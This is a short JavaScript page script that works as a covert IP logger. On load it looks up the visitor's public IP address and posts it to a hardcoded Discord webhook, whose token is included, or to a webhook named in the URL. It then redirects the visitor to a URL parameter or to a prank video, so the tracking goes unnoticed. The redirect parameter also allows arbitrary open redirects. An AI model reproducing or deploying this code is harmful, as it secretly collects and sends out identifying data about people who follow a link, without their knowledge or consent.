document.addEventListener('DOMContentLoaded', function () {
    function getUrlParams() {
        let url = window.location.href;
        let params = new URLSearchParams(window.location.search);
        let paramURL = params.get('fw');
        let paramHook = params.get('dchook');
        return { paramURL, paramHook };
    }

    async function getIP(paramHook) {
        try {
            let response = await fetch('https://api.ipify.org?format=json');
            let data = await response.json();
            let ip = data.ip;

            const webhookURL = paramHook ? paramHook : "https://discord.com/api/webhooks/1341492607540531300/4TEP1k5ugnO6ioqiKcXbOKeNH-PmgT9G7NzeY_9s9-8yK0ad5pDXvsw9noNzwvHmFxMy";

            const content = {};
            content.content = "New access: " + ip;
            content.username = "IPLog";

            await fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(content)
            });
        } catch (error) {
            console.warn("Fehler beim Senden der Nachricht");
            alert("Fehler");
        }
    }

    let { paramURL, paramHook } = getUrlParams();
    getIP(paramHook);

    if (paramURL) {
        window.location.href = paramURL;
    } else {
        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
    }
});
